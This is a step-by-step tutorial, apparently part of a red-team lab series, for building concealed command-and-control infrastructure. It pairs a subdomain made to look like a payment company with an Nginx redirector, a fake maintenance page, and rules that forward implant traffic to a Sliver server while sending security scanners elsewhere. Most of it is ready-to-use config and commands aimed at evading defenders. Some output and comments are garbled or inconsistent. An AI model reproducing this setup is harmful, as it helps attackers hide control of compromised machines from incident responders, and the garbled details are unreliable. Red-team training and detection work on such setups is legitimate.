# Day 2 (Part 2): Configuring Your Domain and Nginx Redirector

---

## Where We Left Off

Yesterday we completed the baseline setup. You have two Azure VMs running behind separate Network Security Groups (NSGs) and internal UFW firewalls. You installed the Sliver server on the C2 VM, started an HTTPS listener on port 8443, and locked down the access so only the redirector's IP can talk to that port.

Right now, if you deployed an implant, it would have to connect directly to the redirector's IP. But we do not use raw IPs for C2 traffic. If we did, the blue team would flag the connection within hours and block the IP, and we would have to generate a new implant with a new IP.

Today we add the domain layer and the proxy logic. We are using our registered domain: `ceruleanpay.online`.

By the end of today, you will have:

1. A subdomain (`updates.ceruleanpay.online`) pointed to your redirector's public IP
2. Nginx installed on the redirector VM and acting as a reverse proxy
3. A real, trusted SSL certificate from Let's Encrypt running on Nginx
4. A smart routing configuration in Nginx that forwards legitimate implant traffic to Sliver but redirects random scanners to a benign website
5. A fully verified traffic path: Operator -> Domain -> Redirector (Nginx) -> C2 Server (Sliver)

Let's get started.

---

## Why We Need a Domain and a Proxy

Let's review the architecture from the OPSEC perspective. Why do we not just point the domain at the C2 server directly?

```
Victim Machine ---> Domain (updates.ceruleanpay.online) ---> C2 Server (Sliver)
```

If you do this:

1. The implant makes a connection to `updates.ceruleanpay.online`.
2. DNS resolves `updates.ceruleanpay.online` to your C2 server's public IP.
3. The implant connects directly to your C2 server.
4. The blue team notices the connection. They run a port scan on the domain or the IP.
5. They hit port 443 on your C2 server. They see Sliver's default web response. They JARM scan it and get Sliver's signature hash.
6. They block the IP and the domain. You lose your C2 server and all active beacons.

Now, look at the redirector setup:

```
Victim Machine ---> Domain (updates.ceruleanpay.online) ---> Redirector (Nginx) ---> C2 Server (Sliver)
```

1. The implant makes a connection to `updates.ceruleanpay.online`.
2. DNS resolves the domain to the **redirector's** public IP.
3. The implant connects to the redirector VM on port 443.
4. The redirector runs Nginx. Nginx handles the TLS connection using a real certificate.
5. Nginx looks at the request path, the headers, and the user agent.
6. If the request looks like our implant, Nginx forwards the traffic over the internal network to the C2 server on port 8443.
7. If a blue team analyst (or an internet crawler like Shodan) visits the domain in a browser or scans it, Nginx says "this request does not match our rules" and serves a fake landing page or redirects them to a real, benign website.
8. If the blue team blocks the redirector's IP, your C2 server is still alive. You spin up a new redirector, point the DNS record to the new IP, and the implant reconnects.

The domain makes the network traffic look normal. The redirector hides the C2 server and deflects investigators.

---

## Step 1: Set Up the Subdomain in Hostinger hPanel

Your domain is `ceruleanpay.online`. We are going to create a subdomain: `updates.ceruleanpay.online`.

Why a subdomain? Because `ceruleanpay.online` looks like a financial or payment processing portal. An endpoint like `updates.ceruleanpay.online` looks like a backend API or update distribution channel. This is exactly what blue teams expect to see in outbound traffic. It blends in.

### Configure DNS in Hostinger

1. Log in to your Hostinger account and navigate to the **hPanel**.
2. Click on **Domains** in the top navigation or find your domain in the list.
3. Click **Manage** next to `ceruleanpay.online`.
4. On the left menu, click **DNS / Nameservers**.
5. Ensure your nameservers are pointed to Hostinger defaults (e.g., `apollo.dns-parking.com` and `athena.dns-parking.com`). If they are not, reset them to Hostinger defaults so you can manage records here.
6. Scroll down to the **Manage DNS records** section.
7. You will see a form to add a new record. Fill it in:

   | Field | Value |
   |-------|-------|
   | **Type** | `A` |
   | **Name** | `updates` (this creates `updates.ceruleanpay.online`) |
   | **Points to** | `REDIRECTOR_PUBLIC_IP` (the public IP of your Nginx VM) |
   | **TTL** | `14400` (or `3600` for faster propagation if you plan to change it soon) |

8. Click **Add Record**.

You will see a success message: `DNS record added successfully`.

### Verify DNS Propagation

DNS changes can take time to spread across the internet. Usually it takes a few minutes, but it can take up to 24 hours. We need to verify it is working before we configure Nginx or try to get an SSL certificate.

On your operator machine (or on the redirector VM itself), open a terminal and run:

```bash
nslookup updates.ceruleanpay.online
```

Expected output:

```
Server:         127.0.0.53
Address:        127.0.0.53#53

Non-authoritative answer:
Name:   updates.ceruleanpay.online
Address: REDIRECTOR_PUBLIC_IP
```

If it returns the correct IP of your redirector VM, the DNS change has propagated. If it returns `NXDOMAIN` or a different IP, wait 5 minutes and try again. Do not proceed to the Certbot step until `nslookup` resolves to the correct IP.

---

## Step 2: Install Nginx and Certbot on the Redirector

SSH into your redirector VM:

```bash
ssh c2admin@REDIRECTOR_PUBLIC_IP
```

Now install Nginx (the web server/proxy) and Certbot (the tool that gets our SSL certificate from Let's Encrypt).

```bash
# Update package list again to make sure everything is current
sudo apt update

# Install Nginx, Certbot, and the Nginx plugin for Certbot
sudo apt install -y nginx certbot python3-certbot-nginx
```

Verify that Nginx is running and enabled on boot:

```bash
sudo systemctl status nginx
```

Expected output:

```
● nginx.service - A high performance web server and a reverse proxy server
     Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled)
     Active: active (running) since Thu 2026-07-02 11:00:00 UTC; 10s ago
```

If it is not active, start it:

```bash
sudo systemctl start nginx
sudo systemctl enable nginx
```

At this point, if you visit `http://updates.ceruleanpay.online` in a web browser, you should see the default Nginx welcome page. This is unencrypted HTTP. We need HTTPS.

---

## Step 3: Generate the SSL Certificate with Certbot

Let's Encrypt provides free SSL certificates. The Certbot tool automates the process of requesting the cert, completing the challenge to prove you own the domain, and configuring Nginx to use it.

### How Certbot Validates Ownership (HTTP-01 Challenge)

When you run Certbot, it communicates with the Let's Encrypt servers. Let's Encrypt says: "Prove you control `updates.ceruleanpay.online`."

To do this, Certbot creates a temporary file in a specific folder on your web server: `/var/www/html/.well-known/acme-challenge/`. Let's Encrypt then makes an HTTP request to `http://updates.ceruleanpay.online/.well-known/acme-challenge/filename`.

If Nginx responds with the correct file contents, Let's Encrypt knows you control the domain (because the domain pointed to your server's IP, and your server answered the request). Let's Encrypt then issues the certificate.

This is why **port 80 must be open** during certificate generation. Certbot needs to handle the HTTP-01 challenge on port 80 before Nginx can switch to HTTPS on port 443.

### Run Certbot

Run the following command on the redirector VM:

```bash
sudo certbot --nginx -d updates.ceruleanpay.online
```

Certbot will ask you for some information:

1. **Email Address:** Enter your work email (or a generic alias). Let's Encrypt uses this to send expiration warnings.
2. **Terms of Service:** Read and agree (type `A` or `Y`).
3. **Share Email:** Share email with the Electronic Frontier Foundation (type `Y` or `N` as you prefer).
4. **Redirect HTTP to HTTPS:** Certbot will ask if you want to automatically redirect all HTTP traffic to HTTPS. Select option `2` (Redirect - Make all requests redirect to secure HTTPS access). This is standard for modern websites and is what we want.

Expected output:

```
Requesting a certificate for updates.ceruleanpay.online

Successfully received certificate.
Certificate is saved at: /etc/letsencrypt/live/updates.ceruleanpay.online/fullchain.pem
Key is saved at:         /etc/letsencrypt/live/updates.ceruleanpay.online/privkey.pem
Gyre expiry date:        2026-09-30 (screenshotted, valid for 90 days)

Deploying certificate
Successfully deployed certificate for updates.ceruleanpay.online to /etc/nginx/sites-enabled/default
Congratulations! You have successfully enabled HTTPS on https://updates.ceruleanpay.online
```

If Certbot fails:
- Check that your DNS is fully propagated (`nslookup` returns the redirector's IP).
- Check that port 80 is not blocked by your firewall. Wait, did we open port 80 in our UFW and NSG rules?
  Ah! Look at the setup from Step 16 yesterday. We only opened port 443 and port 22 in UFW.
  Let's fix that if you get a connection timeout error.

If you get a connection timeout during the challenge, run this on the redirector:

```bash
# Allow port 80 temporarily in UFW
sudo ufw allow 80/tcp
```

And in the Azure portal:
- Go to `redirector-nsg`
- Add an inbound rule allowing port 80 (HTTP) from anywhere
- Re-run the certbot command

Once the certificate is generated, you can close port 80 if you want to be extremely strict, but leaving it open is fine because Nginx will just redirect HTTP to HTTPS.

---

## Step 4: Verify the SSL Certificate

Test that the certificate is active and trusted. From your operator machine, run:

```bash
curl -Iv https://updates.ceruleanpay.online
```

You should see output indicating a successful TLS handshake with a certificate signed by Let's Encrypt:

```
* Server certificate:
*  subject: CN=updates.ceruleanpay.online
*  start date: Jul  2 11:15:00 2026 GMT
*  expire date: Sep 30 11:15:00 2026 GMT
*  subjectAltName: host "updates.ceruleanpay.online" matched
*  issuer: C=US, O=Let's Encrypt, CN=R3
*  SSL certificate verify ok.
...
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
```

"SSL certificate verify ok" means the connection is encrypted and trusted. The redirector is ready.

---

## Step 5: Configure Nginx as a Smart Redirector

Right now, Nginx is just serving the default Ubuntu welcome page. If you connect to `https://updates.ceruleanpay.online`, you get the welcome page. If you send C2 traffic there, Nginx does not know what to do with it.

We need to edit Nginx's configuration so it:
1. Filters incoming requests
2. Forwards valid C2 traffic to the Sliver C2 server on port 8443
3. Serves a fake landing page (or redirects) to anyone else

### Create the Fake Landing Page

We want anyone who browses to `updates.ceruleanpay.online` (scanners, analysts, curious users) to see a normal, boring web page. Since our domain is `ceruleanpay.online`, let's make it look like a payment gateway documentation page or a customer portal under maintenance.

Create a directory for the site files on the redirector:

```bash
sudo mkdir -p /var/www/ceruleanpay
```

Now create a simple index.html file:

```bash
sudo nano /var/www/ceruleanpay/index.html
```

Paste this HTML content:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CeruleanPay - Payment Gateway Portal</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #f8f9fa;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 2rem;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            max-width: 400px;
        }
        h1 {
            color: #0d6efd;
            margin-bottom: 1rem;
        }
        p {
            color: #6c757d;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>CeruleanPay</h1>
        <p>Merchant services portal is currently undergoing scheduled maintenance.</p>
        <p>If you are an integration partner, please contact your account representative for updated API access points.</p>
    </div>
</body>
</html>
```

Save and exit.

### Write the Nginx Configuration

Now we configure Nginx to proxy traffic. We will delete the default configuration and write our own.

Backup the default Nginx config:

```bash
sudo rm /etc/nginx/sites-enabled/default
```

Create our new configuration file:

```bash
sudo nano /etc/nginx/sites-available/c2_redirector
```

Paste the following Nginx configuration. Replace `C2_SERVER_IP` with the actual public IP of your C2 server VM.

```nginx
# Define the backend C2 server pool
upstream sliver_backend {
    server C2_SERVER_IP:8443;
}

# HTTP server block (redirects all HTTP to HTTPS)
server {
    listen 80;
    listen [::]:80;
    server_name updates.ceruleanpay.online;

    location / {
        return 301 https://$host$request_uri;
    }
}

# HTTPS server block
server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name updates.ceruleanpay.online;

    # SSL Certificate Paths (generated by Certbot)
    ssl_certificate /etc/letsencrypt/live/updates.ceruleanpay.online/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/updates.ceruleanpay.online/privkey.pem;

    # Harden SSL Configuration
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA256:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA256';
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 1d;
    ssl_session_tickets off;

    # Root directory for the fake landing page
    root /var/www/ceruleanpay;
    index index.html;

    # Logging
    access_log /var/log/nginx/c2_access.log;
    error_log /var/log/nginx/c2_error.log;

    # Main rule: Default to serving the fake page
    location / {
        try_files $uri $uri/ =404;
    }

    # Proxy rule: Forward matching C2 traffic to Sliver
    # We match request paths that look like Sliver implant traffic
    # Sliver's default HTTP/HTTPS protocol paths are generated randomly or can match patterns
    # For standard setup, we configure a dedicated path proxying rule
    # Sliver implants make POST and GET requests to specific paths
    # To keep things flexible, we proxy paths that we configure the implant to use
    location ~* ^/(api/v1/updates|static/js/|login/oauth/) {
        
        # OPSEC check: block common user agents used by security crawlers and default tools
        if ($http_user_agent ~* (curl|wget|python|nikto|nmap|zgrab|censys|shodan)) {
            return 302 https://www.google.com;
        }

        # Forward the traffic to the C2 server
        proxy_pass https://sliver_backend;

        # Configure headers so Sliver knows the real client IP, not Nginx's IP
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # Connection settings for stable C2 beaconing
        proxy_ssl_verify off; # Ignore Sliver's self-signed cert internally
        proxy_buffering off;
        proxy_read_timeout 3600s;
        proxy_send_timeout 3600s;
        
        # Override Server header to blend in
        proxy_pass_header Server;
    }
}
```

Save and exit.

### Enable the Configuration and Restart Nginx

Enable the site configuration by creating a symlink in the `sites-enabled` directory:

```bash
sudo ln -s /etc/nginx/sites-available/c2_redirector /etc/nginx/sites-enabled/
```

Now test the Nginx configuration for syntax errors:

```bash
sudo nginx -t
```

Expected output:

```
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
```

If it fails:
- Check for missing semicolons (`;`) at the end of lines.
- Check that the paths to the SSL certificates are correct.
- Check that you replaced `C2_SERVER_IP` with the actual C2 server VM IP.

If syntax is OK, restart Nginx to apply changes:

```bash
sudo systemctl restart nginx
```

---

## Step 6: How the Proxy Header Rules Work

Let's look at the specific headers we set in the proxy rule. These are critical for OPSEC and analysis.

```nginx
proxy_set_header Host $host;
proxy_set_header X-Real-IP $remote_addr;
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
```

**Host:** This passes the original host header (`updates.ceruleanpay.online`) to Sliver.

**X-Real-IP / X-Forwarded-For:** This is the most important part. Because Nginx sits between the target machine and Sliver, Sliver will naturally think that the connection is coming from the redirector's IP. If you look at the active sessions in Sliver, every session will show the IP address of the redirector.

If you don't pass these headers, you lose the ability to see which target machine is checking in. If you have 5 compromised workstations, they will all show up in your C2 console as coming from the same IP (the redirector). By setting `X-Forwarded-For`, Nginx appends the client's actual IP to the request. Sliver reads this header and shows the true client IP in the console.

**proxy_ssl_verify off:** Sliver uses its own self-signed SSL certificate for the internal job listener on port 8443. Nginx by default will reject connections to upstream servers that have invalid or self-signed certificates. We tell Nginx to ignore this because we know the upstream C2 server is ours and we trust it.

**Location path matching:** Notice this line:
`location ~* ^/(api/v1/updates|static/js/|login/oauth/)`

This tells Nginx to only proxy requests where the URL path starts with one of these strings.
For example:
- `https://updates.ceruleanpay.online/api/v1/updates?id=123` -> Proxy to C2 server
- `https://updates.ceruleanpay.online/static/js/main.js` -> Proxy to C2 server
- `https://updates.ceruleanpay.online/` -> Serve local index.html (fake page)
- `https://updates.ceruleanpay.online/admin` -> Serve local 404 error

This is how we separate C2 traffic from scanner traffic. When we generate the implant tomorrow, we must configure it to use one of these paths for its check-ins. If we do not, Nginx will not forward the traffic and the implant will fail to connect.

---

## Step 7: Verify the Traffic Flow End-to-End

We have Nginx running, certificate active, and Sliver listener waiting. Let's test the entire path.

From your **operator machine** (not inside the VMs), run three curl tests.

### Test 1: Verify the Fake Landing Page

Run:

```bash
curl -s https://updates.ceruleanpay.online | grep "CeruleanPay"
```

Expected output:

```
    <title>CeruleanPay - Payment Gateway Portal</title>
        <h1>CeruleanPay</h1>
```

This confirms that normal browsing to the domain returns the fake landing page. This is what scanners and defenders see.

### Test 2: Verify the Scanner Block Rule

Run:

```bash
curl -I -A "censys" https://updates.ceruleanpay.online/api/v1/updates
```

We are request a proxy path but setting the User-Agent to `censys` (a known internet scanner). Nginx should match the user-agent block rule and redirect to Google.

Expected output:

```
HTTP/1.1 302 Moved Temporarily
Server: nginx
Date: Thu, 02 Jul 2026 11:20:00 GMT
Content-Type: text/html
Content-Length: 138
Connection: keep-alive
Location: https://www.google.com
```

It returned a `302` redirect to Google. The scanner block rule is working.

### Test 3: Verify the Proxy Routing Rule

Now request the proxy path with a normal user-agent:

```bash
curl -k -Iv -A "Mozilla/5.0" https://updates.ceruleanpay.online/api/v1/updates
```

This should bypass the user-agent check, match the path check, and get forwarded to Sliver on the C2 server. Because we are not sending real C2 data, Sliver should return its default 404 response.

Expected output:

```
* Connected to updates.ceruleanpay.online (REDIRECTOR_PUBLIC_IP) port 443 (#0)
...
* ALPN, server accepted to use h2
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
...
> GET /api/v1/updates HTTP/2
> Host: updates.ceruleanpay.online
> User-Agent: Mozilla/5.0
...
< HTTP/2 404
< content-type: text/plain; charset=utf-8
< content-length: 19
< date: Thu, 02 Jul 2026 11:22:00 GMT
...
404 page not found
```

Notice the response headers:
- Connected to the redirector's IP on port 443.
- Returned `HTTP/2 404` and `404 page not found`.
- This 404 is the response generated by Sliver, forwarded through Nginx back to you.

You just verified the full loop:
1. Curl sent request to domain
2. DNS resolved to Redirector
3. Redirector (Nginx) verified path `/api/v1/updates` and allowed User-Agent `Mozilla/5.0`
4. Redirector forwarded to C2 Server (Sliver) on port 8443
5. Sliver processed request, returned 404
6. Redirector sent 404 back to you

The infrastructure works.

---

## Troubleshooting common issues

### Issue: Nginx fails to start or gives configuration error

**Fix:** Run `sudo nginx -t` to see the exact line number and error message. Common syntax errors:
- Missing semicolons at the end of configuration directives.
- Typo in upstream server IP or port.
- Certbot certificate paths do not match (check `/etc/letsencrypt/live/updates.ceruleanpay.online/` directory exists and has files).

### Issue: Certbot fails with timeout during verification

**Cause:** Let's Encrypt cannot connect to your redirector VM on port 80 to complete the challenge.

**Fix:**
- Verify `nslookup updates.ceruleanpay.online` returns the redirector IP.
- Verify port 80 is open in Azure NSG (`redirector-nsg`).
- Verify port 80 is open in UFW on the redirector:
  ```bash
  sudo ufw allow 80/tcp
  sudo ufw reload
  ```

### Issue: You get a `502 Bad Gateway` error in Test 3

**Cause:** Nginx received the request and tried to forward it, but could not connect to Sliver.

**Fix:**
- Check if Sliver is running on the C2 server: `sudo systemctl status sliver`.
- Check if the HTTPS listener is active in Sliver: open sliver and run `jobs`.
- Check the C2 server's NSG allows port 8443 from the redirector's IP.
- Check the C2 server's UFW allows port 8443 from the redirector's IP:
  ```bash
  sudo ufw status numbered
  ```
- Try to ping the C2 server IP from the redirector VM to ensure they have network connectivity within the VNet.

---

## Status Check

At this point:

| Resource | Status |
|---|---|
| Domain `updates.ceruleanpay.online` | Pointing to redirector IP |
| Nginx VM | Running, port 80/443 open |
| SSL certificate | Active (issued by Let's Encrypt) |
| Proxy rules | Verified (normal traffic gets landing page, scanner gets redirected, proxy path gets 404 from Sliver) |
| C2 VM | Running, ports closed to public, accepts 8443 from redirector |

Tomorrow we perform the final phase: generating the Sliver implant configured for this exact domain and path, executing it on our test Windows machine, and verifying that the C2 session connects securely and stays completely hidden.

---

**Next Step:** [03_payload_test.md](./03_payload_test.md)

Generating your Sliver payload, configuring the custom proxy connection paths, executing it on a Windows VM, and verifying the traffic signature.
